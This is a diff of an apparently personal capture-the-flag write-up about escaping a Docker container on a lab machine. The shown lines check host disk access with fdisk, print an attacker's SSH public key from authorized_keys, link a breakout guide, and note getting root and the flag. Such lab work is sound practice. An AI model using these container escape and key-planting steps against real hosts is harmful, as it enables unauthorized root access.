@@ -1,5 +1,6 @@
 # Breaking out of docker container
 ## Check if it is possible to get the privileges to see the host drive
+[reference link for escaping docker container](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout)
 Yes, it is possible to get the privileges to see the host drive using `fdisk -l` command on docker container.
 ```bash
 root@gitlab:~# fdisk -l
@@ -115,5 +116,8 @@ cat authorized_keys
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCi89K9avljGKUu6su01gg8oV19+F+heoQ/qF7cLTjCQvZ/UaJhEe9xTC5mil3Ld0vxN7A0ayT0CZxasyLykh/TjlUbtH2mMtMUUs7WCaZqby+8DRL4/2o3WCOtS4KG8/QE96b6KS7f8+92yCMmeNmeBLCSEtGZr4PeLDCnmQ9LkpS629YucNFbLm4LqmeVObklX6/ofdPR++htRLAFYoIOXv5Z04TNgKxCNEUCsqws5Oe7ODiQ48xdSeA+51OCS3DFfakgwg3T6w53XSX+cyJEdComJPa3Djj+6HXafeHpi0CFbGR+JVGhcNjFM21iZfpVd0af4BPxkUhwQH8TEQAzOC4CaAKUEtmzJDLPwUSZ0mJHDUJawIi33Sn6Ib5Sn9kNqdQe6lUZdJMQHumQ6/N1AqVM3GZwf+0TNtLAtRcUMpg37mr6/ESrzfZkNaEyqh80b2fgGgYEnG2y5C14da3TTVvKrQbO3ezH/VNwLspXskfTd2LZwq4NDBDAUvPJqA0= kali@kali
 ```
 ## Getting ssh shell as root on ready machine
-```bash
+![[Pasted image 20210412064222.png]]
+## Got root.txt flag
+![[Pasted image 20210412064313.png]]
+
 
